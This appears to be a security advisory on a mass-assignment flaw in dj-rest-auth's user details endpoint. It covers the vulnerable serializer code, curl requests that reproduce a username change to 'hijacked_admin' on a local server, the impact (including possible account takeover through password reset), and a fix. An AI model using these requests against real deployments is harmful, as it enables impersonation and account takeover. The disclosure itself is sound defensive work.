# Vuln-3: Mass Assignment on UserDetailsView

**Project:** dj-rest-auth (https://github.com/iMerica/dj-rest-auth)
**Version:** 7.1.1 (commit `c0c9c23`)
**Date:** 2026-03-14
**Severity:** MEDIUM
**CWE:** CWE-915 - Improperly Controlled Modification of Dynamically-Determined Object Attributes

---

## Affected Files

```text
dj_rest_auth/serializers.py (lines 174-190)
dj_rest_auth/views.py (lines 218-240)
```

## Root Cause

`UserDetailsSerializer` includes `USERNAME_FIELD` (typically `username`) as a writable field. The `read_only_fields` tuple hardcodes only `('email',)`:

## Vulnerable Code

```python
# serializers.py:174-190
class Meta:
    extra_fields = []
    if hasattr(UserModel, 'USERNAME_FIELD'):
        extra_fields.append(UserModel.USERNAME_FIELD)  # writable!
    if hasattr(UserModel, 'EMAIL_FIELD'):
        extra_fields.append(UserModel.EMAIL_FIELD)
    ...
    fields = ('pk', *extra_fields)
    read_only_fields = ('email',)  # hardcoded string, not dynamic
```

Two issues exist:

1. `username` is writable by default, allowing any user to change their own username.
2. `read_only_fields` hardcodes the string `'email'` rather than using `UserModel.EMAIL_FIELD`. If a custom User model uses a different email field name (e.g., `email_address`), the actual email field becomes writable.

## Steps to Reproduce

```bash
# 1. Register and login
TOKEN=$(curl -s -X POST http://127.0.0.1:8000/api/auth/login/ \
  -H 'Content-Type: application/json' \
  -d '{"username":"normaluser","password":"TestPass123!"}' | python -c "import sys,json; print(json.load(sys.stdin)['key'])")

# 2. Change username via PATCH
curl -s -X PATCH http://127.0.0.1:8000/api/auth/user/ \
  -H "Authorization: Token $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"username":"hijacked_admin"}'
# Returns: {"pk":1,"username":"hijacked_admin","email":"normal@test.com",...}
```
![alt text](../dists/dj_rest_auth3.png)
## Impact

- **Username spoofing:** Users can change their username to impersonate other users (e.g., `admin`) in systems that display or rely on usernames for identity.
- **Email field bypass:** With custom User models where `EMAIL_FIELD != 'email'`, the email address becomes writable, enabling account takeover via password reset to an attacker-controlled email.

## Recommended Fix

Make `USERNAME_FIELD` read-only by default, and dynamically resolve `EMAIL_FIELD` for `read_only_fields`:

```python
class Meta:
    ...
    read_only_fields = ('pk', UserModel.USERNAME_FIELD, UserModel.EMAIL_FIELD)
```

---

## References

- [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html)
- [dj-rest-auth source repository](https://github.com/iMerica/dj-rest-auth)
